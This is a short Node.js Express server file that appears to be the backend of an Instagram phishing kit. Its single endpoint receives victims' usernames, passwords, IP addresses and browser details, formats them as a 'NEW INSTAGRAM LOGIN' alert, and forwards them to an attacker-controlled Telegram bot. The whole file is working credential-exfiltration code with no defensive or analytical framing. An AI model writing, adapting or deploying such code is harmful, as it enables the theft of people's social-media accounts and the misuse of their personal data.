// server.js (Node.js with Express)
const express = require('express');
const axios = require('axios');
const app = express();

const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

app.use(express.json());

app.post('/api/send-credentials', async (req, res) => {
    try {
        const { username, password, ip, userAgent, ...otherInfo } = req.body;
        
        const message = `🔴 NEW INSTAGRAM LOGIN 🔴
        
📧 Username: ${username}
🔑 Password: ${password}
🌐 IP: ${ip}
🖥️ Browser: ${userAgent}
📍 Time: ${new Date().toLocaleString()}
📱 Platform: ${otherInfo.platform}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        
        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to send message' });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
